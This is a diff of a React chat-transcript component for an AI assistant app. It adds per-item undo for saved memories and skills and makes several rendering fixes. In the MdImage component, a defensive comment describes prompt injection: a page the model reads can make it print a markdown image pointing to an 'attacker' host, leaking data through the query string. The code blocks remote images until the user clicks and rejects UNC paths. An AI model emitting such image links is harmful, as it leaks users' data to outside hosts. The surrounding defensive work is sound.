@@ -1,4 +1,4 @@
-import { Fragment, memo, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
+import { Fragment, memo, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
 import { api, learnApi, type LearnedItem } from "../lib/api";
 import {
   AlertTriangle,
@@ -38,33 +38,173 @@ import {
   type MdBlock,
 } from "./markdown";
 
-/** "Aprendi: …" under an answer, with one undo for everything it saved. */
+function formatLearnedItemText(item: LearnedItem): string {
+  if (item.kind === "skill" && item.name) {
+    return item.text ? `${item.name}: ${item.text}` : item.name;
+  }
+  return item.text;
+}
+
+/** Antigravity-style collapsible card for what the background review saved after a turn. */
 function LearnedNote(props: { text: string; items: LearnedItem[] }) {
-  const [state, setState] = useState<"idle" | "busy" | "done" | string>("idle");
-  const undo = () => {
-    setState("busy");
-    Promise.all(props.items.map((i) => learnApi.undo(i)))
-      .then(() => setState("done"))
-      .catch((e) => setState(String(e)));
+  const [open, setOpen] = useState(false);
+  const [undoneIdx, setUndoneIdx] = useState<Set<number>>(() => new Set());
+  const [busyAll, setBusyAll] = useState(false);
+  const [busyIdx, setBusyIdx] = useState<Set<number>>(() => new Set());
+  const [error, setError] = useState<string | null>(null);
+
+  const total = props.items.length;
+  const allUndone = total > 0 && undoneIdx.size >= total;
+  const anyBusy = busyAll || busyIdx.size > 0;
+
+  const title = allUndone
+    ? "Aprendizado desfeito"
+    : total === 1
+      ? props.items[0].kind === "skill"
+        ? "Skill salva"
+        : "Memória salva"
+      : `${total} aprendizados salvos`;
+
+  const preview =
+    props.items
+      .map(formatLearnedItemText)
+      .filter(Boolean)
+      .join(" · ") || props.text.replace(/^Aprendi:\s*/, "");
+
+  const undoOne = async (idx: number) => {
+    if (undoneIdx.has(idx) || anyBusy) return;
+    setError(null);
+    setBusyIdx((prev) => new Set(prev).add(idx));
+    try {
+      await learnApi.undo(props.items[idx]);
+      setUndoneIdx((prev) => new Set(prev).add(idx));
+    } catch (e) {
+      setError(e instanceof Error ? e.message : String(e));
+    } finally {
+      setBusyIdx((prev) => {
+        const next = new Set(prev);
+        next.delete(idx);
+        return next;
+      });
+    }
   };
-  const failed = state !== "idle" && state !== "busy" && state !== "done";
+
+  const undoAll = async () => {
+    if (allUndone || anyBusy) return;
+    const remaining = props.items
+      .map((_, idx) => idx)
+      .filter((idx) => !undoneIdx.has(idx));
+    if (!remaining.length) return;
+    setError(null);
+    setBusyAll(true);
+    const succeeded: number[] = [];
+    let firstErr: unknown = null;
+    try {
+      for (const idx of remaining) {
+        try {
+          await learnApi.undo(props.items[idx]);
+          succeeded.push(idx);
+        } catch (err) {
+          if (firstErr == null) firstErr = err;
+        }
+      }
+      if (succeeded.length > 0) {
+        setUndoneIdx((prev) => {
+          const next = new Set(prev);
+          for (const idx of succeeded) next.add(idx);
+          return next;
+        });
+      }
+      if (firstErr != null) {
+        setError(firstErr instanceof Error ? firstErr.message : String(firstErr));
+      }
+    } finally {
+      setBusyAll(false);
+    }
+  };
+
   return (
-    <div className={"msg-note msg-learned" + (state === "done" ? " undone" : "")}>
-      <Sparkles size={14} strokeWidth={2} aria-hidden />
-      <span>{state === "done" ? "Desfeito: " + props.text.replace(/^Aprendi: /, "") : props.text}</span>
-      {state === "done" ? null : (
+    <div className={"learned-card" + (open ? " open" : "") + (allUndone ? " undone" : "")}>
+      <div className="learned-head">
         <button
           type="button"
-          className="learned-undo"
-          onClick={undo}
-          disabled={state === "busy"}
-          title={failed ? state : "Apagar o que foi aprendido neste turno"}
+          className="learned-toggle"
+          aria-expanded={open}
+          onClick={() => setOpen((v) => !v)}
         >
-          <Undo2 size={13} strokeWidth={2} aria-hidden />
-          Desfazer
+          <Sparkles size={13} strokeWidth={2} className="learned-icon" aria-hidden />
+          <span className="learned-title">{title}</span>
+          {preview ? (
+            <span className="learned-preview" title={preview}>
+              {preview}
+            </span>
+          ) : null}
         </button>
-      )}
-      {failed ? <span className="learned-error">{state}</span> : null}
+        {!allUndone ? (
+          <button
+            type="button"
+            className="learned-undo"
+            onClick={(e) => {
+              e.stopPropagation();
+              void undoAll();
+            }}
+            disabled={anyBusy}
+            title={error ?? "Apagar o que foi aprendido neste turno"}
+          >
+            <Undo2 size={12} strokeWidth={2} aria-hidden />
+            <span>Desfazer</span>
+          </button>
+        ) : null}
+        <span
+          className="learned-chev"
+          aria-hidden="true"
+          onClick={() => setOpen((v) => !v)}
+        >
+          <ChevronRight size={14} strokeWidth={2} className="chev" />
+        </span>
+      </div>
+      {open ? (
+        <div className="learned-body">
+          {props.items.map((item, idx) => {
+            const isUndone = undoneIdx.has(idx);
+            const isBusy = busyAll || busyIdx.has(idx);
+            const kindLabel = item.kind === "skill" ? "Skill" : "Memória";
+            const opLabel =
+              item.op === "update" || item.op === "patch" ? ` · ${item.op}` : "";
+            const itemText = formatLearnedItemText(item);
+            return (
+              <div key={idx} className={"learned-item" + (isUndone ? " undone" : "")}>
+                <span className="learned-badge">
+                  {kindLabel}
+                  {opLabel}
+                </span>
+                <span className={"learned-item-text" + (isUndone ? " undone" : "")}>
+                  {itemText}
+                </span>
+                {isUndone ? (
+                  <span className="learned-item-done">Desfeito</span>
+                ) : (
+                  <button
+                    type="button"
+                    className="learned-undo"
+                    onClick={() => void undoOne(idx)}
+                    disabled={isBusy}
+                    title="Desfazer este item"
+                  >
+                    <Undo2 size={12} strokeWidth={2} aria-hidden />
+                    <span>Desfazer</span>
+                  </button>
+                )}
+              </div>
+            );
+          })}
+        </div>
+      ) : null}
+      {error ? (
+        <p className="learned-error" role="alert">
+          {error}
+        </p>
+      ) : null}
     </div>
   );
 }
@@ -144,13 +284,20 @@ function SubagentCard({ block }: { block: Extract<Block, { kind: "subagent" }> }
       {open && hasDetails ? (
         <div className="subagent-body">
           {block.steps.length > 0 ? (
-            <ul className="subagent-steps">
-              {block.steps.map((s, idx) => (
-                <li key={idx}>{s}</li>
-              ))}
-            </ul>
+            <>
+              <ul className="subagent-steps">
+                {block.steps.map((s, idx) => (
+                  <li key={idx}>{s}</li>
+                ))}
+              </ul>
+              {block.summary &&
+              block.summary.trim() !==
+                block.steps[block.steps.length - 1]?.trim() ? (
+                <p className="subagent-summary">{block.summary}</p>
+              ) : null}
+            </>
           ) : (
-            <p>{block.summary}</p>
+            <p className="subagent-summary">{block.summary}</p>
           )}
         </div>
       ) : null}
@@ -168,16 +315,20 @@ function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: s
     window.addEventListener("keydown", onKey);
     return () => window.removeEventListener("keydown", onKey);
   }, [onClose]);
-  const open = () => (isWeb(src) ? void api.openUrl(src) : void api.openImage(src));
+  const isHttp = /^https?:/i.test(src);
+  const canOpenExternally = isHttp || !isWeb(src);
+  const open = () => (isHttp ? void api.openUrl(src) : void api.openImage(src));
   return (
     <div className="lightbox" role="dialog" aria-label={alt || "Imagem"} onClick={onClose}>
       <img src={url} alt={alt} onClick={(e) => e.stopPropagation()} />
       <div className="lightbox-bar" onClick={(e) => e.stopPropagation()}>
-        <span className="lightbox-name">{alt || src.split(/[\\/]/).pop()}</span>
-        <button className="btn btn-sm" onClick={open}>
-          <ExternalLink size={14} strokeWidth={2} />
-          Abrir fora
-        </button>
+        <span className="lightbox-name">{alt || (src.startsWith("data:") ? "Imagem" : src.split(/[\\/]/).pop())}</span>
+        {canOpenExternally ? (
+          <button className="btn btn-sm" onClick={open}>
+            <ExternalLink size={14} strokeWidth={2} />
+            Abrir fora
+          </button>
+        ) : null}
         <button className="icon-btn sm" onClick={onClose} aria-label="Fechar" title="Fechar (Esc)">
           <X size={16} strokeWidth={2} />
         </button>
@@ -192,19 +343,21 @@ function MdImage({ src, alt }: { src: string; alt: string }) {
   // A page the model read can make it print `![](https://attacker/x?d=...)`:
   // loading that by itself is a zero-click ping (or a leak in the query). A
   // remote image therefore waits for the click; local files and data: URLs
-  // load as before.
+  // load as before. UNC / protocol-relative paths are always rejected.
+  const blockedUnc = src.startsWith("//") || src.startsWith("\\\\") || src.startsWith("/\\");
   const remote = /^https?:/i.test(src);
   const [allowed, setAllowed] = useState(!remote);
   const [url, setUrl] = useState<string | null>(isWeb(src) && !remote ? src : null);
-  const [failed, setFailed] = useState<string | null>(null);
+  const [failed, setFailed] = useState<string | null>(blockedUnc ? "caminho UNC recusado" : null);
   const [zoom, setZoom] = useState(false);
   useEffect(() => {
     setAllowed(!remote);
     setUrl(isWeb(src) && !remote ? src : null);
-    setFailed(null);
+    setFailed(blockedUnc ? "caminho UNC recusado" : null);
     setZoom(false);
-  }, [src, remote]);
+  }, [src, remote, blockedUnc]);
   useEffect(() => {
+    if (blockedUnc) return;
     if (remote) {
       if (!allowed) return;
       setUrl(src);
@@ -219,7 +372,7 @@ function MdImage({ src, alt }: { src: string; alt: string }) {
     return () => {
       live = false;
     };
-  }, [src, remote, allowed]);
+  }, [src, remote, allowed, blockedUnc]);
   if (failed) {
     return (
       <span className="md-img-fail" title={failed}>
@@ -474,8 +627,10 @@ function parseMermaidGraph(src: string): { nodes: GraphNode[]; edges: GraphEdge[
 }
 
 function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
+  const markerId = `mermaid-arrow-${useId().replace(/[^a-zA-Z0-9_-]/g, "")}`;
   const graph = useMemo(() => parseMermaidGraph(text), [text]);
-  const [view, setView] = useState<"diagram" | "code">(graph ? "diagram" : "code");
+  const [userView, setUserView] = useState<"diagram" | "code" | null>(null);
+  const view = userView ?? (graph ? "diagram" : "code");
 
   if (!graph) {
     return (
@@ -519,7 +674,7 @@ function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
           <button
             type="button"
             className="copy-btn"
-            onClick={() => setView(view === "diagram" ? "code" : "diagram")}
+            onClick={() => setUserView(view === "diagram" ? "code" : "diagram")}
           >
             <span>{view === "diagram" ? "Ver código" : "Ver diagrama"}</span>
           </button>
@@ -537,7 +692,7 @@ function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
           >
             <defs>
               <marker
-                id="mermaid-arrow"
+                id={markerId}
                 viewBox="0 0 10 10"
                 refX="9"
                 refY="5"
@@ -568,7 +723,7 @@ function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
                     stroke="currentColor"
                     strokeOpacity="0.45"
                     strokeWidth="1.5"
-                    markerEnd="url(#mermaid-arrow)"
+                    markerEnd={`url(#${markerId})`}
                   />
                   {e.label ? (
                     <text
@@ -593,7 +748,7 @@ function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
                     width={nodeW}
                     height={nodeH}
                     rx="8"
-                    fill="var(--bg-elevated, rgba(127,127,127,0.12))"
+                    fill="var(--layer-2)"
                     stroke="currentColor"
                     strokeOpacity="0.35"
                     strokeWidth="1.25"
@@ -845,7 +1000,7 @@ function ToolLine({ row }: { row: ToolRow }) {
             {arg}
           </span>
         )}
-        <span className="spacer" />
+        {isFileTool ? <span className="spacer" /> : null}
         <span className="tool-state" role="img" aria-label={STATE_LABEL[state]}>
           {state === "run" ? (
             <span className="spinner" />
@@ -889,8 +1044,8 @@ const AssistantBlock = memo(function AssistantBlock(props: {
         ) : null}
         {b.tools.length > 0 ? (
           <div className="tools">
-            {b.tools.map((t) => (
-              <ToolLine key={t.id} row={t} />
+            {b.tools.map((t, idx) => (
+              <ToolLine key={`${t.id}-${idx}`} row={t} />
             ))}
           </div>
         ) : null}
@@ -1028,52 +1183,58 @@ export function Transcript(props: {
             <p>Conversa vazia. Escreva abaixo para começar; use / para comandos e @ para citar arquivos.</p>
           </div>
         ) : null}
-        {props.blocks.map((b, i) => {
-          // A block the event did not touch keeps its reference, so `memo`
-          // skips it: only the answer being written is re-rendered. The key is
-          // the stored row when there is one, so a list that grows at the top
-          // (a compaction note) does not re-key everything.
-          const key =
-            b.kind === "assistant"
-              ? (b.stored ?? `a${i}`)
-              : b.kind === "user"
-                ? (b.id ?? `u${i}`)
-                : b.kind === "subagent"
-                  ? `sub-${b.id}`
-                  : `n${i}`;
-          if (b.kind === "user") {
-            return <UserRow key={key} block={b} onEdit={onEdit} />;
-          }
-          if (b.kind === "subagent") {
-            return <SubagentCard key={key} block={b} />;
-          }
-          if (b.kind === "note" && b.learned?.length) {
-            return <LearnedNote key={key} text={b.text} items={b.learned} />;
-          }
-          if (b.kind === "note") {
+        {(() => {
+          let aOrd = 0;
+          let uOrd = 0;
+          let nOrd = 0;
+          const rendered = props.blocks.map((b) => {
+            // A block the event did not touch keeps its reference, so `memo`
+            // skips it: only the answer being written is re-rendered. Keying
+            // by per-kind ordinal keeps keys stable across streaming→stored
+            // transitions and borrowIds while preventing cross-kind collisions.
+            if (b.kind === "user") {
+              return <UserRow key={`u-${uOrd++}`} block={b} onEdit={onEdit} />;
+            }
+            if (b.kind === "subagent") {
+              return <SubagentCard key={`sub-${b.id}`} block={b} />;
+            }
+            if (b.kind === "note" && b.learned?.length) {
+              return <LearnedNote key={`n-${nOrd++}`} text={b.text} items={b.learned} />;
+            }
+            if (b.kind === "note") {
+              return (
+                <div key={`n-${nOrd++}`} className="msg-note">
+                  <Info size={14} strokeWidth={2} />
+                  <span>{b.text}</span>
+                </div>
+              );
+            }
             return (
-              <div key={key} className="msg-note">
-                <Info size={14} strokeWidth={2} />
-                <span>{b.text}</span>
-              </div>
+              <AssistantBlock
+                key={`a-${aOrd++}`}
+                block={b}
+                sessionId={props.sessionId}
+                onBranch={onBranch}
+              />
             );
-          }
-          return <AssistantBlock key={key} block={b} sessionId={props.sessionId} onBranch={onBranch} />;
-        })}
-        {/*
-          The answer block is born on the first event, so a slow turn used to
-          look frozen: the dots stand in for it while the turn is running.
-        */}
-        {props.busy &&
-        !(
-          props.blocks[props.blocks.length - 1]?.kind === "assistant" &&
-          (props.blocks[props.blocks.length - 1] as { streaming?: boolean }).streaming
-        ) ? (
-          <AssistantBlock
-            block={{ kind: "assistant", text: "", reasoning: "", tools: [], streaming: true }}
-            sessionId={props.sessionId}
-          />
-        ) : null}
+          });
+          return (
+            <>
+              {rendered}
+              {/*
+                The answer block is born on the first event, so a slow turn used to
+                look frozen: the dots stand in for it while the turn is running.
+              */}
+              {props.busy && !props.blocks.some((b) => b.kind === "assistant" && b.streaming) ? (
+                <AssistantBlock
+                  key={`a-${aOrd}`}
+                  block={{ kind: "assistant", text: "", reasoning: "", tools: [], streaming: true }}
+                  sessionId={props.sessionId}
+                />
+              ) : null}
+            </>
+          );
+        })()}
         {props.tail}
       </div>
     </div>
